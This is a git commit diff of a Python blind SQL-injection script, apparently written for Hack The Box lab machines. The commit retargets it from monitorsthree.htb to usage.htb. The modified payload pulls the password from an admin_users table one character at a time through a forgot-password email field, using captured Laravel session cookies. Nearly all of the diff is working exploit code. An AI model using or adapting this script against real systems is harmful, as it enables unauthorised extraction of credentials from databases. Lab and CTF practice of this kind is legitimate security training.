bd04ab24db5ab9003f576ecd4f87848e5f459ab3
I77umio <72460666+i77umio@users.noreply.github.com>
2024-08-25 18:05:37 -0400

    Update blind_error-based_sqli_scipt.py

--- blind_error-based_sqli_scipt.py
+++ blind_error-based_sqli_scipt.py
@@ -12,29 +12,29 @@ password=[]
 
 
 print("\n--+--  Starting on blind sql probe  --+--\n")
-# CHANGE -> change sqli on line 20 !!!!
+
 for i in range(1,62):
 	for char_dec in range(32,127):
 		proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-		url="http://monitorsthree.htb/forgot_password.php"
-		sqli_payload=f"blabla' or ASCII(SUBSTR((select database() LIMIT 1), {i}, 1)) collate utf8mb4_bin = '{char_dec}'-- -"
+		url="http://usage.htb/forget-password"
+		sqli_payload=f"test@test.com' or ASCII(SUBSTR((SELECT password FROM admin_users LIMIT 1), {i}, 1)) collate utf8mb4_bin = '{char_dec}'-- -"
 		form_data={'_token': 'JoIK085HLwVbX7ym98y9P8GoHxHDtlH5DLploQda','email': sqli_payload}
 		headers={
-		    "Host": "monitorsthree.htb",
+		    "Host": "usage.htb",
 		    "Upgrade-Insecure-Requests": "1",
-		    "Origin": "http://monitorsthree.htb",
+		    "Origin": "http://usage.htb",
 		    "Content-Type": "application/x-www-form-urlencoded",
 		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
 		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		    "Referer": "http://monitorsthree.htb/forgot_password.php",
+		    "Referer": "http://usage.htb/forget-password",
 		    "Accept-Encoding": "gzip, deflate, br",
 		    "Accept-Language": "en-US,en;q=0.5",
 		    "Connection": "close",
-		    "Cookie": "PHPSESSID=3r7u0hb3cicipqqahekadn36n7"
+		    "Cookie": "XSRF-TOKEN=eyJpdiI6IkxDWXB0UmI4RWJJTDdqQitGZG42aEE9PSIsInZhbHVlIjoiL0JjRHB2NFVoZm5ZclhBY1ZRazhWcFJQZDVCQ2NSODV1dXdGSG1ES3A2S2hVOU5RalBGWU82UHNUTnZTNkFBSUVLMHJBZTVlMDIzYkxyQnVxYTduT2cwa05UM3N2Y2d3aUtkRXhodVd3dStrYzcxeVNwUE9kT094TFFrbVMvaDYiLCJtYWMiOiJmNjNkODZkNGExYjJmZDZlMjQyNWE3MTUxN2NiNzViNGU2OTA2ZmM5NDRjNWFjN2MyZTZjMjlkMmYwMjg4NmIzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkUxL1UvV21VQ3poVGRJSzlyUk1NY2c9PSIsInZhbHVlIjoiMXUvemFIaFh2M1lTd1B5VGh5MURJMWtKNXBXWm1VMWpjbGFRdDR1VGJiWFJyVklEVkNHZTAwM1hCN3E1ak1xeFVFb0ZQSEduaUxvbWlydUhpOTYwdDdMNGI1eHhwMW5nbGM5UDZlMmJkNHFvMlIyZkFrRnM4Zyt3L1Z1eVhNYmYiLCJtYWMiOiJmNWRmNWZkNWZiOTg2ZTEzMDRhM2RhMDgyZTEyYmNlZTBkOGY1OTEyMDBlMjc4YTc4ZTEwODc5ZmM2M2UyMzAyIiwidGFnIjoiIn0%3D"
 			}
 		response=requests.post(url,data=form_data,headers=headers,verify=False,allow_redirects=True)
 		#print(response.text)
-		if('Successfully' in response.text):	#CHANGE -> based on response text on succesful guess
+		if('test@test.com' in response.text):
 			password.append(chr(char_dec))
 			
 			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: ",char_dec)
